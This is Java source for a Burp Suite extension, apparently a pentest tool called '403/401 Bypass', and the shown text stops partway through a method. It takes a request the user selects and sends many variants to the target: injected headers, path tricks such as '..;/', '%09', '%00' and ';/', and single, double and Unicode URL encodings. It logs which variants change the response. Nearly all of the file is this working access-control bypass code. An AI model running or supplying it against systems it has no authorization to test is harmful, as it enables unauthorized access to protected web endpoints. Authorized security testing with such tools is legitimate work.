package burp; /**
 * @auther Skay
 * @date 2022/1/7 11:26
 * @description
 */
import burp.*;
import com.sun.deploy.util.StringUtils;

import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.PrintWriter;
import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.io.File;
import java.io.FileNotFoundException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IContextMenuFactory{
    public IBurpExtenderCallbacks callbacks;
    public IExtensionHelpers helpers;
    public PrintWriter stdout;
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private Table logTable;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;
    private int loghang = 0;

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
//        if(invocation.getToolFlag() == IBurpExtenderCallbacks.TOOL_TARGET){
        if(true){
            List<JMenuItem> menus = new ArrayList<>(1);
            IHttpRequestResponse responses[] = invocation.getSelectedMessages();
            JMenuItem menuItem = new JMenuItem("Try Bypass");
            menus.add(menuItem);
            menuItem.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    // logTable.addRowSelectionInterval();
                    int row = log.size();
                    LogEntry logEntry = new LogEntry(helpers.analyzeRequest(responses[0]).getUrl(), "scanning", "", responses[0]);
                    log.add(logEntry);
                    fireTableRowsInserted(row, row);
//                     在事件触发时是不能发送网络请求的，否则可能会造成整个burp阻塞崩溃，所以必须要新起一个线程来进行漏洞检测
                    Thread thread = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                start(responses[0], row);
                            } catch (InterruptedException ex) {
                                throw new RuntimeException(ex);
                            }
                        }
                    });
                    thread.start();
                }
            });
            return menus;
        }else {
            return null;
        }

    }

    @Override
    public IHttpService getHttpService() {
        return null;
    }

    @Override
    public byte[] getRequest() {
        return new byte[0];
    }

    @Override
    public byte[] getResponse() {
        return new byte[0];
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }

    @Override
    public int getRowCount() {
        return log.size();
    }

    @Override
    public int getColumnCount() {
        return 3;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex) {
        LogEntry logEntry = log.get(rowIndex);

        switch (columnIndex)
        {
            case 0:
                return logEntry.url.toString();
            case 1:
                return logEntry.status;
            case 2:
                return logEntry.res;
            default:
                return "";
        }
    }

    // 用于描述一条请求记录的数据结构
    private static class LogEntry{
        final URL url;
        final String status;
        final String res;
        final IHttpRequestResponse requestResponse;

        LogEntry(URL url, String status, String res, IHttpRequestResponse requestResponse) {
            this.url = url;
            this.status = status;
            this.res = res;
            this.requestResponse = requestResponse;
        }
    }

    // 自定义table的changeSelection方法，将request\response展示在正确的窗口中
    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
            currentlyDisplayedItem = logEntry.requestResponse;

            super.changeSelection(row, col, toggle, extend);
        }
    }

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)         {
        this.callbacks = callbacks;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.helpers = callbacks.getHelpers();
        this.stdout.println("[+] Skay");
        this.stdout.println("[+] 403/401 Bypass");
        this.stdout.println("######################");
        callbacks.setExtensionName("Bypass");
        callbacks.registerScannerCheck(this);
        callbacks.registerContextMenuFactory(this);
        SwingUtilities.invokeLater(new Runnable(){
            @Override
            public void run() {
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);
                splitPane.setLeftComponent(scrollPane);

                JTabbedPane tabs = new JTabbedPane();
                requestViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                tabs.addTab("Request", requestViewer.getComponent());
                tabs.addTab("Response", responseViewer.getComponent());
                splitPane.setRightComponent(tabs);

                BurpExtender.this.callbacks.customizeUiComponent(splitPane);
                BurpExtender.this.callbacks.customizeUiComponent(logTable);
                BurpExtender.this.callbacks.customizeUiComponent(scrollPane);
                BurpExtender.this.callbacks.customizeUiComponent(tabs);

                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
            }
        });
    }

    public String myreplace(String url,String replace){
        String tmpurl = String.valueOf(new StringBuffer(url).reverse());
        String tmpurl1 = tmpurl.replaceFirst("/","*aa*");
        String tmpurl2 = new StringBuffer(tmpurl1).reverse().toString();

        return tmpurl2.replace("*aa*",replace);
    }

    public String myreplace1(String url,String replace){
        String tmpurla = url.substring(url.indexOf("://")+3);
        String tmurlb = url.substring(0,url.indexOf("://")+3);
        return tmurlb+tmpurla.replace("/","//");
    }

    public String join(Collection var0, String var1) {
        StringBuffer var2 = new StringBuffer();
        for(Iterator var3 = var0.iterator(); var3.hasNext(); var2.append((String)var3.next())) {
            if (var2.length() != 0) {
                var2.append(var1);
            }
        }

        return var2.toString();
    }

    public List<String> misc(IRequestInfo requestInfo,Payload payload){
        Iterator<Map.Entry<String, String>> miscentries = payload.MiscPayload.entrySet().iterator();
        String url = requestInfo.getUrl().toString();
        List<String> listmisc = new LinkedList<>();
        String newurl = null;
        while (miscentries.hasNext()) {
            Map.Entry<String, String> miscepayload = miscentries.next();
            switch (miscepayload.getKey()){
                case "Tab":
                    newurl = myreplace(url,"%09/");
                    break;
                case ".\\":
                    newurl = myreplace(url,"/.\\");
                    break;
                case "Tab:":
                    newurl = myreplace(url,"%09:");
                    break;
                case "Tab..":
                    newurl = myreplace(url,"/aaa/%09../");
                    break;
                case "Spach":
                    newurl = myreplace(url,"/ ");
                    break;
                case "%23?":
                    newurl = myreplace(url,"%23?");
                    break;
                case "//":
                    newurl = myreplace1(url,"//");
                    break;
                case "/":
                    break;
                case "/..":
                    newurl = myreplace(url,"/aa/../");
                    break;
                case "../":
                    newurl = myreplace(url,"../");
                    break;
                case "/ %23":
                    newurl = myreplace(url,"/ %23");
                    break;
                case "/%23":
                    newurl = myreplace(url,"/%23");
                    break;
                case "/;/":
                    newurl = myreplace(url,"/;/");
                    break;
                case "/://":
                    newurl = myreplace(url,"/://");
                    break;
                case "/?":
                    newurl = myreplace(url,"/?");
                    break;
                case ";":
                    newurl = myreplace(url,";/");
                    break;
                case ";Tab":
                    newurl = myreplace(url,";%09");
                    break;
                case ";/..":
                    newurl = myreplace(url,";/aa/../");
                    break;
                case ";/../..//":
                    newurl = myreplace(url,";/aa/bb/../../");
                    break;
                case ";///../":
                    newurl = myreplace(url,";///aa/../");
                    break;
                case "?%23":
                    newurl = myreplace(url,"/?%23");
                    break;
                case "??":
                    newurl = myreplace(url,"/??");
                    break;
                case "..":
                    newurl = myreplace(url,"/../");
                    break;
                case "..\t":
                    newurl = myreplace(url,"/aa/..%09/");
                    break;
                case "..%0d/;":
                    newurl = myreplace(url,"/aa/..%0d/;/");
                    break;
                case "..%0d;/":
                    newurl = myreplace(url,"/aa/..%0d;/");
                    break;
                case "..\\/":
                    newurl = myreplace(url,"/aa/..\\/");
                    break;
                case "\\/":
                    newurl = myreplace1(url,"\\/");
                    break;
                case "..%ff/;":
                    newurl = myreplace(url,"/aa/..%ff/;/");
                    break;
                case "..%ff;/":
                    newurl = myreplace(url,"/aa/..%ff/;/");
                    break;
                case "..;%0d":
                    newurl = myreplace(url,"/aa/..;%0d/");
                    break;
                case "..;%ff":
                    newurl = myreplace(url,"/aa/..;%ff/");
                    break;
                case "..;\\":
                    newurl = myreplace(url,"/aa/..;\\/");
                    break;
                case "..;\\.;":
                    newurl = myreplace(url,"/aa/..;\\;/");
                    break;
                case "..\\;":
                    newurl = myreplace(url,"/aa/..\\;/");
                    break;
                case "..;/":
                    newurl = myreplace(url,"/aa/..;/");
                    break;
                case "..;\\/":
                    newurl = myreplace(url,"/aa/..;\\/");
                    break;
                case "./":
                    newurl = myreplace(url,"./");
                    break;
                case "/*":
                    newurl = myreplace(url,"*/");
                    break;
                case "\\*":
                    newurl = myreplace(url,"\\*");
                    break;
                case "/;/;/;/":
                    newurl = myreplace(url,"/;/;/;/");
                    break;
                case "/;a/;b/":
                    newurl = myreplace(url,"/;a/;b/");
                    break;
                case ".js":
                    newurl = url+".js";
                    break;
                case ".png":
                    newurl = url+".png";
                    break;
                case "%00":
                    newurl = myreplace(url,"%00/");
                    break;

            }
            listmisc.add(newurl);
        }

        return listmisc;
    }

    public static int appearNumber(String srcText, String findText) {
        int count = 0;
        Pattern p = Pattern.compile(findText);
        Matcher m = p.matcher(srcText);
        while (m.find()) {
            count++;
        }
        return count;
    }
    //这里是真的逻辑
    public void start(IHttpRequestResponse baseRequestResponse, int row) throws InterruptedException {
//        System.out.println("aaaaaaaaa");
        int logadd = 0;
        IRequestInfo OriginalRequest = this.helpers.analyzeRequest(baseRequestResponse);
        IResponseInfo OriginalResponse = helpers.analyzeResponse(baseRequestResponse.getResponse());
        Payload payload =  new Payload();
        IHttpService iHttpService = baseRequestResponse.getHttpService();
        //Header Payload
        List<String> headers =  OriginalRequest.getHeaders();
        Iterator<Map.Entry<String, String>> headersentries = payload.HeaderPayload.entrySet().iterator();
        while (headersentries.hasNext()) {
            Map.Entry<String, String> eachheaderpayload = headersentries.next();
            if(eachheaderpayload.getValue().contains("${domain}")){
                try {
                    URL url = new java.net.URL(String.valueOf(OriginalRequest.getUrl()));
                    String host = url.getHost();// 获取主机名
                    eachheaderpayload.getValue().replace("${domain}",host);
                }catch (Exception e){

                }
            }
            headers.add(eachheaderpayload.getValue());
            byte[] postMessage = this.helpers.buildHttpMessage(headers,new String(baseRequestResponse.getRequest()).substring(OriginalRequest.getBodyOffset()).getBytes(StandardCharsets.UTF_8));
            IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);

            IResponseInfo newResponse = helpers.analyzeResponse(resp.getResponse());
            headers.remove(eachheaderpayload.getValue());
            //判断返回内容是否有
            LogEntry logEntry;
            if((OriginalResponse.getStatusCode() != newResponse.getStatusCode()) && (OriginalResponse.getBodyOffset() != newResponse.getBodyOffset())){
                logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Succsee "+eachheaderpayload.getKey(), resp);
            }else {
                logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Fail "+eachheaderpayload.getKey(), resp);
            }
            log.add(logEntry);
            log.set(row+1, logEntry);
            logadd = logadd + 1;
        }
        fireTableRowsUpdated(this.loghang, logadd);
        Thread.sleep(1000);
        this.stdout.println("try Header Payload");
        this.stdout.println("try Port Payload");
        this.stdout.println("try Protocol Payload");



        //EncodePayload
        Iterator<Map.Entry<String, String>> encodeentries = payload.EncodePayload.entrySet().iterator();
        while (encodeentries.hasNext()) {
            Map.Entry<String, String> eachencodepayload = encodeentries.next();
            String encodeurl = null;
            List<String> misclist = misc(OriginalRequest,payload);
            this.stdout.println(eachencodepayload.getKey());
            switch (eachencodepayload.getKey()){
                case "Unicode":
                    for (int i = 0; i < misclist.size(); i++) {
                        if(misclist.get(i).contains("%")){
                            encodeurl = misclist.get(i).replace("%","%u00");
                            misclist.set(i,encodeurl);
                        }else {
                            encodeurl = misclist.get(i);
                            misclist.set(i,encodeurl);
                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
//                            this.stdout.println("ppppppppppppppppm"+appearNumber(new String(baseRequestResponse.getRequest()),"\r\n"));
//                            this.stdout.println("mmmmmmmmmmmmmmmmmmmpm"+String.valueOf(pm.size()));
                            thepath = new URL(misclist.get(i)).getPath();
                            if (pm.get(0).contains("GET")) {
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            } else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size() < appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=1;iaddtims<addtims;iaddtims++){
                                    pm.add("\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace(this.stdout);
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);

                    }
                    break;
                case "URLEncode":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace(".", "%2E").replace(";","%3B").replace("/","%2f").replace("\\","%5C").replace("#","%23");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "URLEncodeDouble":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace(".", "%252E").replace(";","%253B").replace("/","%252f").replace("\\","%255C").replace("#","%2523");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "EncodeContent":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String tmpurla = misclist.get(i).substring(misclist.get(i).lastIndexOf("/"));
                            String tmphttp = misclist.get(i).substring(0,misclist.get(i).lastIndexOf("/"));
                            encodeurl = tmphttp+URLEncoder.encode(tmpurla, "UTF-8");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode;":
                    for (int i = 0; i < misclist.size(); i++) {
                        encodeurl = misclist.get(i).replace(";","%3B");
                        misclist.set(i,encodeurl);
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode.":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace(".", "%2E");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode/":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace("/", "%2F");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode\\":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace("\\", "%5C");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode;.":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace(".", "%2E").replace(";","%3B");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode;/":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace("/", "%2F").replace(";","%3B");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode\\/":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace("\\", "%5C").replace("/","%2F");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
                            if(pm.size()<appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")){
                                int addtims = appearNumber(new String(baseRequestResponse.getRequest()),"\r\n")-pm.size();
                                for(int iaddtims=0;iaddtims<addtims;iaddtims++){
                                    pm.add(addtims+iaddtims,"\r\n");
                                }
                            }
                            byte[] postMessage = join(pm, "\r\n").getBytes(StandardCharsets.UTF_8);
                            resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                        }catch (Throwable e){
                            e.printStackTrace();
                        }

                        LogEntry logEntry;
                        logEntry = new LogEntry(OriginalRequest.getUrl(), "finished", "Please Check "+thepath, resp);
                        log.add(logEntry);
                        log.set(row+1, logEntry);
                        logadd = logadd + 1;
                        fireTableRowsUpdated(this.loghang, logadd);
                        Thread.sleep(1000);
                    }
                    break;
                case "Encode./":
                    for (int i = 0; i < misclist.size(); i++) {
                        try {
                            String encodepath = new URL(misclist.get(i)).getPath();
                            encodeurl = misclist.get(i).substring(0,misclist.get(i).indexOf(encodepath))+encodepath.replace(".", "%2E").replace("/","%2F");
                            misclist.set(i,encodeurl);
                        }catch (Exception e){

                        }
                        //这里发送更新后的请求
                        IHttpRequestResponse resp = null;
                        String thepath = null;
                        try {
                            List<String> pm = new ArrayList<>(Arrays.asList(new String(baseRequestResponse.getRequest()).split("\r\n")));
                            thepath = new URL(misclist.get(i)).getPath();
                            if(pm.get(0).contains("GET")){
                                pm.set(0, "GET " + thepath + " HTTP/1.1");
                            }else {
                                pm.set(0, "POST " + thepath + " HTTP/1.1");
                            }
